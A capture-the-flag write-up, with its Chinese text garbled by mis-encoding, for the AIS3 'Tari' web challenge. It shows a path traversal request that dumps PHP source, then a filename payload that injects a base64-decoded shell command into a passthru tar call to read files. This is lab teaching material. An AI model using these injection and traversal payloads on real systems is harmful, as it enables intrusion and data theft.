<p>é€™é¡Œçµ¦äº†ä¸€å€‹å¯ä»¥æŠŠæª”æ¡ˆè®Šæˆ .tar.gz çš„ç¶²ç«™ã€‚æ­¥é©Ÿåˆ†ç‚ºå…©æ­¥ï¼Œé¦–å…ˆåœ¨<code class="language-plaintext highlighter-rouge">/</code>ä¸Šå‚³æª”æ¡ˆï¼Œç„¶å¾Œæœƒå¾—åˆ°ä¸€å€‹<code class="language-plaintext highlighter-rouge">/download.php</code>çš„é€£çµï¼Œç”¨ä¾†ä¸‹è¼‰æª”æ¡ˆã€‚è§€å¯Ÿå¯ä»¥ç™¼ç¾<code class="language-plaintext highlighter-rouge">download.php</code>çš„<code class="language-plaintext highlighter-rouge">file</code>åƒæ•¸æœ‰ path traversal çš„å•é¡Œï¼Œæ–¼æ˜¯æˆ‘å€‘å¯ä»¥dumpå‡ºåŸå§‹ç¢¼:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /download.php?file=Li4vaW5kZXgucGhw&amp;name=index.php
</code></pre></div></div>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>Tari<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>Tari is a service that converts your file into a .tar.gz archive.<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"file"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Upload"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="n">get_MyFirstCTF_flag</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">// **MyFirstCTF ONLY FLAG**</span>
    <span class="c1">// Please IGNORE this flag if you are AIS3 Pre-Exam Player</span>

    <span class="c1">// Congratulations, you found the flag!</span>
    <span class="c1">// RCE me to get the second flag, it placed in the / directory :D</span>
    <span class="k">echo</span> <span class="s1">'MyFirstCTF FLAG: AIS3{../../3asy_pea5y_p4th_tr4ver5a1}'</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">tar</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span> <span class="mf">.</span> <span class="s2">".tar.gz"</span><span class="p">;</span>
    <span class="nv">$source</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="mi">1</span><span class="p">);</span>
    <span class="nv">$destination</span> <span class="o">=</span> <span class="s2">"./files/</span><span class="nv">$path</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">passthru</span><span class="p">(</span><span class="s2">"tar czf '</span><span class="nv">$destination</span><span class="s2">' --transform='s|</span><span class="nv">$source</span><span class="s2">|</span><span class="nv">$filename</span><span class="s2">|' --directory='/tmp' '/</span><span class="nv">$source</span><span class="s2">'"</span><span class="p">,</span> <span class="nv">$return</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$return</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">[</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="p">[</span><span class="kc">FALSE</span><span class="p">,</span> <span class="kc">FALSE</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">===</span> <span class="kc">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"&lt;p&gt;No file was uploaded.&lt;/p&gt;"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"&lt;p&gt;Error: Upload error.&lt;/p&gt;"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="p">[</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">]</span> <span class="o">=</span> <span class="nf">tar</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$path</span> <span class="o">===</span> <span class="kc">FALSE</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"&lt;p&gt;Error: Failed to create archive.&lt;/p&gt;"</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$path</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
            <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s2">"&lt;a href=</span><span class="se">\"</span><span class="s2">/download.php?file=</span><span class="nv">$path</span><span class="s2">&amp;name=</span><span class="nv">$filename</span><span class="s2">.tar.gz</span><span class="se">\"</span><span class="s2">&gt;Download&lt;/a&gt;"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>é¡Œç›®é€™è£¡æç¤ºèªªè¦æ‰¾åˆ°RCEï¼Œé€™è£¡ä¸€å€‹æ˜é¡¯çš„é¸æ“‡æ˜¯<code class="language-plaintext highlighter-rouge">passthru</code>è£¡é¢çš„<code class="language-plaintext highlighter-rouge">filename</code>ã€‚é€™è£¡ä¸çŸ¥é“ç‚ºä»€éº¼ï¼Œå¦‚æœå‚³çµ¦ä»–çš„ä»»ä½•åƒæ•¸åŒ…å«<code class="language-plaintext highlighter-rouge">/</code>æˆ–<code class="language-plaintext highlighter-rouge">\</code>ï¼ŒæŒ‡ä»¤å°±ä¸æœƒåŸ·è¡Œï¼Œæ‰€ä»¥æˆ‘å€‘å¿…é ˆæƒ³è¾¦æ³•ç¹éé€™å€‹é™åˆ¶ã€‚æœ€å¾Œæˆ‘æ‰¾åˆ°çš„è¾¦æ³•æ˜¯ç”¨base64ç¹éå»ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>filename="';X=`echo Y2F0IC8qLnR4dA==|base64 -d`;$X;'"
</code></pre></div></div>

<p>å¦‚æ­¤ä¾¿æœƒåŸ·è¡Œ <code class="language-plaintext highlighter-rouge">cat /*.txt</code>ã€‚Flag: <code class="language-plaintext highlighter-rouge">AIS3{test_flag (to be changed)}</code></p>
:ET